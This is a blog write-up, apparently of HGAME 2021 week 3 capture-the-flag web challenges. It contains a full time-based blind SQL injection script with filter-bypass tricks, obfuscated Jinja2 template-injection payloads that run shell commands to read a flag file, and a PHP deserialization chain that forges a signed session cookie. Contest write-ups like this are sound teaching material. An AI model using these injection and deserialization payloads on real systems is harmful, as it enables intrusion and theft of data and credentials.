---
title: HGAME-Web-Week3WP
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-02-20 23:05:32
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg
---
一、Liki-Jail

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215192601.png)

只有一个登录框，输入啥都是返回相同的内容（除非有非法字符），初步猜测是时间盲注。

第一步，测一下可用的字符：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215192447.png)

可以看到空格单引号都被过滤了，但是空格可以用/**/代替，单引号的话这里我用了转义符号，稍微解释一下：后台的语句大概是 select xxx from xxx where username='Troy3e' and password='caibi'，这时，如果我们另username为Troy3e\，password为

    /**/or/**/sleep(2)#

那么原语句就变为

    where username='Troy3e\' and password='/**/or/**/sleep(2)#'

就相当于where username='xxx' or sleep(2)#，所以会延时两秒。

接下来就是普通盲注的思路了，脚本如下：

    import requests
    import datetime
    import time
    
    flag = ""
    url = "https://jailbreak.liki.link/login.php"
    for i in range(1,1000):
        l = 32
        h = 128
        mid = (l + h) // 2
        while(l<h):
            name = "admin\\"
            #payload = "/**/or/**/if((ascii(substr(database(),{0},1)))>{1},1,sleep(2))#".format(i,mid) #库名为week3sqli
            #payload = "/**/or/**/if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema/**/like/**/database())),{0},1))>{1}),1,sleep(2))#".format(i,mid) #表名为u5ers
            #payload = "/**/or/**/if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name/**/like/**/0x7535657273)),{0},1))>{1}),1,sleep(2))#".format(i,mid) #列名为usern@me,p@ssword
            #payload = "/**/or/**/if((ascii(substr((select(group_concat(`usern@me`))from(week3sqli.u5ers)),{0},1))>{1}),1,sleep(2))#".format(i,mid) #用户名为admin
            payload = "/**/or/**/if((ascii(substr((select(group_concat(`p@ssword`))from(week3sqli.u5ers)),{0},1))>{1}),1,sleep(2))#".format(i,mid) #密码为sOme7hiNgseCretw4sHidd3n
            data = {"username":name,"password":payload}
            time1 = datetime.datetime.now()
            r = requests.post(url=url,data=data)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec<=1:
                l = mid + 1
            else:
                h = mid
            mid = (l + h) // 2
        flag += chr(mid)
        print(flag)
    print(flag)

有三个小点讲一下：
1、等号=被过滤，我们可以使用like绕过。
2、等号后面的单引号被过滤，我们用十六进制代替。
3、usern@me和p@ssword加反引号的原因是@是mysql的特殊字，需要用反引号包围，否则跑不出来，可以自己试一下。

拿到账号密码登录：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215212219.png)

    hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}

二、Forgetful

一个非常简单的SSTI，一分钟就秒了。（不知道SSTI的务必百度自学一下，这个东西比赛很常见）

之前NCTF的payload直接就打通了：https://troyess.com/2020/11/23/NCTF2020%E7%AD%BE%E5%88%B0%E6%91%B8%E9%B1%BC/

查看目录：

    {{""["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fm"+"ro\x5f\x5f"][1]["\x5f\x5fsub\x63lasses\x5f\x5f"]()[117]["\x5f\x5fin"+"it\x5f\x5f"]["\x5f\x5fglo"+"bals\x5f\x5f"]["popen"]("dir /")["read"]()}}

尝试读取flag：

    {{""["\x5f\x5fcl\x61ss\x5f\x5f"]["\x5f\x5fb\x61ses\x5f\x5f"][0]["\x5f\x5fsubcla" "sses\x5f\x5f"]()[166]["\x5f\x5fini\x74\x5f\x5f"]["\x5f\x5fglob\x61ls\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["eval"]("\x5f\x5fimport\x5f\x5f(\x27os\x27)\x2epopen(\x27cat /flag\x27)\x2eread()")}}

返回"Stop!!!"，读取失败，测试多次后猜测只要直接返回了flag里的内容就会阻止你读取。
既然不能直接读，那就间接呗：

    {{""["\x5f\x5fcl\x61ss\x5f\x5f"]["\x5f\x5fb\x61ses\x5f\x5f"][0]["\x5f\x5fsubcla" "sses\x5f\x5f"]()[166]["\x5f\x5fini\x74\x5f\x5f"]["\x5f\x5fglob\x61ls\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["eval"]("\x5f\x5fimport\x5f\x5f(\x27os\x27)\x2epopen(\x27cd ..;base64 flag\x27)\x2eread()")}}

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215214103.png)

    hgame{h0w_4bou7+L3arn!ng~PythOn^Now?}

三、Post to zuckonit2.0 & Post to zuckonit another version

发生甚么事了

四、Arknights

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217115128.png)

根据题目描述，本模拟器是用git搭建的，暗示存在git源码泄露。

Githack获取源码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217120810.png)

关键看simulator.php

    <?php
    
    class Simulator{

        public $session;
        public $cardsPool;
    
        public function __construct(){
    
            $this->session = new Session();
            if(array_key_exists("session", $_COOKIE)){
                $this->session->extract($_COOKIE["session"]);
            }
    
            $this->cardsPool = new CardsPool("./pool.php");
            $this->cardsPool->init();
        }
    
        public function draw($count){
            $result = array();
    
            for($i=0; $i<$count; $i++){
                $card = $this->cardsPool->draw();
    
                if($card["stars"] == 6){
                    $this->session->set('', $card["No"]);
                }
    
                $result[] = $card;
            }
    
            $this->session->save();
    
            return $result;
        }
    
        public function getLegendary(){
            $six = array();
    
            $data = $this->session->getAll();
            foreach ($data as $item) {
                $six[] = $this->cardsPool->cards[6][$item];
            }

            return $six;
        }
    }
    
    class CardsPool
    {

        public $cards;
        private $file;

        public function __construct($filePath)
        {
            if (file_exists($filePath)) {
                $this->file = $filePath;
            } else {
                die("Cards pool file doesn't exist!");
            }
        }
    
        public function draw()
        {
            $rand = mt_rand(1, 100);
            $level = 0;
    
            if ($rand >= 1 && $rand <= 42) {
                $level = 3;
            } elseif ($rand >= 43 && $rand <= 90) {
                $level = 4;
            } elseif ($rand >= 91 && $rand <= 99) {
                $level = 5;
            } elseif ($rand == 100) {
                $level = 6;
            }
    
            $rand_key = array_rand($this->cards[$level]);
    
            return array(
                "stars" => $level,
                "No" => $rand_key,
                "card" => $this->cards[$level][$rand_key]
            );
        }
    
        public function init()
        {
            $this->cards = include($this->file);
        }
    
        public function __toString(){
            return file_get_contents($this->file);
        }
    }
    
    
    class Session{
    
        private $sessionData;
    
        const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
    
        public function __construct(){}
    
        public function set($key, $value){
            if(empty($key)){
                $this->sessionData[] = $value;
            }else{
                $this->sessionData[$key] = $value;
            }
        }
    
        public function getAll(){
            return $this->sessionData;
        }
    
    
        public function save(){
    
            $serialized = serialize($this->sessionData);
            $sign = base64_encode(md5($serialized . self::SECRET_KEY));
            $value = base64_encode($serialized) . "." . $sign;
    
            setcookie("session",$value);
        }
    
    
        public function extract($session){
    
            $sess_array = explode(".", $session);
            $data = base64_decode($sess_array[0]);
            $sign = base64_decode($sess_array[1]);
    
            if($sign === md5($data . self::SECRET_KEY)){
                $this->sessionData = unserialize($data);
            }else{
                unset($this->sessionData);
                die("Go away! You hacker!");
            }
        }
    }

    
    class Eeeeeeevallllllll{
        public $msg="坏坏liki到此一游";
    
        public function __destruct()
        {
            echo $this->msg;
        }
    }

首先找到获取flag的点：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217121406.png)

有一个tostring魔法函数和file_get_contents函数，那么只要我们能控制file变量以及能够触发tostring函数，就可以读取flag.php。

这时注意到最后出题人留下的痕迹：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217121724.png)

有一个echo，很明显是让你触发tostring的，所以只要令msg new一个类即可触发tostring，但是new哪一个类呢？肯定是能让我们控制file变量的CardsPool类了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217122308.png)

记得file前面一定改为public。。。private打不通，原因可能是%00在后面base64编码和md5加密的时候会出问题，可能是这样。

好的现在成功构造了pop链，但是没有反序列化点的话，都是徒劳的，也就是说还没有一个触发点。

Session类里有一个反序列化，能不能利用呢：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217122616.png)

可以看到data就是我们session前半部分base64解码后的结果，所以说，是可控的。但是上面还有一个触发的条件，懒得细说了，上面secretkey已经给出，很好伪造，这里把脚本贴出来：

    <?php
    highlight_file(__FILE__);
    class test
    {
	     const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
	     public $data;
	     function __destruct(){
		    $payload='O:17:"Eeeeeeevallllllll":1:{s:3:"msg";O:9:"CardsPool":1:{s:4:"file";s:10:"./flag.php";}}';
		    $sign=base64_encode(md5($payload . self::SECRET_KEY));
		    echo '<br/>';
		    echo $sign;
		    echo '<br/>';
		    $key=base64_encode($payload);
		    echo $key;
		    echo '<br/>';
		    $value = base64_encode($payload) . "." . $sign;
		    $sess_array = explode(".", $value);
		    echo '<br/>';
		    echo base64_decode($sess_array[0]);
		    echo '<br/>';
		    echo base64_decode($sess_array[1]);
		    echo '<br/>';
            $a = base64_decode($sess_array[0]);
            $b = base64_decode($sess_array[1]);
		    if($b === md5($a . self::SECRET_KEY)){
		    	echo "success";
		    	echo '<br/>';
		    }
		    echo $value;
	     }
     }
     $a=new test();
    ?> 

脚本比较啰嗦，懒得改了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217123207.png)

将得到的payload放到session里面发送即可得到flag

    hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}